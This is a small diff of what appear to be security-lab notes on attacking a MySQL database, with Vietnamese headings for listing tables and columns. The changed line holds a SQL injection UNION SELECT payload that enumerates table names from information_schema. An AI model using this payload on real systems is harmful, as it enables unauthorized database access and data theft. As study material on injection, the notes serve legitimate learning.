@@ -15,8 +15,7 @@ Use MySQL database, the structure of database as the image below(like Securityan
 		
 
 ----------lấy ra tên của bảng: 
-	
-	''union select 3,table_name,4 from information_schema.tables where table_schema='applicationdomain' union select 5,6,'7'
+	     ''union select 3,table_name,4 from information_schema.tables where table_schema='applicationdomain' union select 5,6,'7'
 	
 
 -----------lấy ra các trường trong bảng: 
